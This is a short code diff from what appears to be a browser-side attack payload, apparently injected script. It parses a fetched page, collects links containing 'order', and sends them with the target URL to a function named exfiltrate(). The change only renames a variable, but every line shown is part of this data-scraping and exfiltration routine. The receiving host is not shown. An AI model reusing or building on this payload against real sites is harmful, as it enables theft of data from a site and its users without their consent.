@@ -27,8 +27,8 @@ async function exfiltrate(data) {
     let doc = convert_to_dom(html_text);
 
     // this example search for urls containing the word order.
-    let orders_urls = search_urls(doc, 'a[href*="order"]');
-    await exfiltrate(`[${target_url}] => [${orders_urls.toString()}]\n`);
+    let found_urls = search_urls(doc, 'a[href*="order"]');
+    await exfiltrate(`[${target_url}] => [${found_urls.toString()}]\n`);
 
   } catch (e) { console.log(e) }
 })();
